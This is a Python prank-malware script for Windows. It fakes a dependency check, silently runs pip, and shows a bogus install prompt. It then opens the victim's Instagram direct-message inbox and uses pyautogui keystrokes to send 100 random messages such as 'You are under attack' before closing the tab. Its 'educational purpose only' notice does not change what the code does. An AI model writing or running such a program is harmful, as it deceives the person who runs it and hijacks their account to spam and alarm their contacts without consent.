import random
import time
import pyautogui as pg 
import webbrowser
import os
from win32api import *
from win32gui import *
import win32con
import sys, os
import struct
import time
import requests

print("Checking dependencies...")
time.sleep(1)
os.system("pip install pyautogui")
os.system("cls")
input("Some requered modules are not installed, Enter y to install(y/n): ")
class notify:
    def __init__(self, title, msg,t=1):
        message_map = {
                win32con.WM_DESTROY: self.OnDestroy,
        }
        wc = WNDCLASS()
        hinst = wc.hInstance = GetModuleHandle(None)
        wc.lpszClassName = "PythonTaskbar"
        wc.lpfnWndProc = message_map
        classAtom = RegisterClass(wc)
        # Create the Window.
        style = win32con.WS_OVERLAPPED | win32con.WS_SYSMENU
        self.hwnd = CreateWindow( classAtom, "Taskbar", style, \
                0, 0, win32con.CW_USEDEFAULT, win32con.CW_USEDEFAULT, \
                0, 0, hinst, None)
        UpdateWindow(self.hwnd)
        iconPathName = os.path.abspath(os.path.join( sys.path[0], "passlock" ))
        icon_flags = win32con.LR_LOADFROMFILE | win32con.LR_DEFAULTSIZE
        try:
           hicon = LoadImage(hinst, iconPathName, \
                    win32con.IMAGE_ICON, 0, 0, icon_flags)
        except:
          hicon = LoadIcon(0, win32con.IDI_APPLICATION)
        flags = NIF_ICON | NIF_MESSAGE | NIF_TIP
        nid = (self.hwnd, 0, flags, win32con.WM_USER+20, hicon, "passlock.png")
        Shell_NotifyIcon(NIM_ADD, nid)
        Shell_NotifyIcon(NIM_MODIFY, \
                         (self.hwnd, 0, NIF_INFO, win32con.WM_USER+20,\
                          hicon, "Python",msg,200,title))
        if t>5:
            time.sleep(t)
        DestroyWindow(self.hwnd)
    def OnDestroy(self, hwnd, msg, wparam, lparam):
        nid = (self.hwnd, 0)
        Shell_NotifyIcon(NIM_DELETE, nid)
        PostQuitMessage(0) 


webbrowser.open('https://www.instagram.com/direct/inbox/', new=2)
time.sleep(3)
pg.moveTo(x=100, y=200)
pg.press("Tab")
pg.press("Tab")

time.sleep(1)
pg.click(x=100, y=200)

for i in range(12):
    pg.moveTo(x=100, y=200)
    pg.press("Tab")
pg.press("Enter")

for i in range(100):
    pg.write(random.choice(["Sorry!","Don't blame","This is not real","You are under attack","But i'm your friend","Hey dude","What's up?","Sorry dude","Don't worry","It's a prank","Bye"]))
    pg.press("Enter")
    pg.moveTo(x=100, y=200)

time.sleep(1)
pg.hotkey('ctrl', 'w')
os.system("cls")
input("\n\nHope you'll not exicute any files without proper knowledge\n\t\t\t\t\t\t-py")
notify("Thanks for your cooperation","Don't blame, For educational purpose only.\nBYE")

